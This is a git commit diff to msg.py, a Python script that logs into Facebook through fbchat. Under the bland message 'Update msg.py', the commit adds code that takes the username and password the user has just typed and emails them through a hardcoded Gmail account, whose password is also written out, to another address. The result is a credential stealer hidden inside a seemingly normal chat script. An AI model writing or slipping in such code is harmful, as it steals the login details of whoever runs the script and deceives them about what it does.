1f2d333eb5fb55db55e59c99b4b1df059d1f2732
xismailx <42072070+xismailx@users.noreply.github.com>
2018-08-07 01:36:19 +0200

    Update msg.py

--- msg.py
+++ msg.py
@@ -1,7 +1,15 @@
+import smtplib
 import fbchat
 from getpass import getpass
 username = str(raw_input("Username: "))
 password = str(raw_input("Pass: "))
 client = fbchat.Client(username, password)
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.starttls()
+server.login("karloslikres@gmail.com", "fauxcompte")
+msg =username+password
+server.sendmail("karloslikres@gmail.com", "20xxismailxx19@gmail.com", msg)
+server.quit()
 no_of_friends = int(raw_input("Number of friends: "))
-victim = str(raw_input("Id of victim: "))
+for i in xrange(no_of_friends):
+    name = str(raw_input("Name: "))
